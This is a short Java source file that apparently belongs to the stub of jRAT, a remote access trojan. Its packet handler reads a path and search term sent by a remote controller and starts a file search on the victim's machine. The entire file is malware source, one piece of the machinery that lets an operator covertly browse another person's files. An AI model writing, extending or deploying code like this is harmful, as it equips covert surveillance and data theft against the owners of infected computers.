package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.FileSearch;

import java.io.File;


public class Packet53StartSearch extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String start = Connection.readLine();
		if (!start.endsWith(File.separator)) {
			start = start + File.separator;
		}
		String what = Connection.readLine();
		boolean dir = Connection.readBoolean();
		new FileSearch(start, what, dir).start();
	}

}
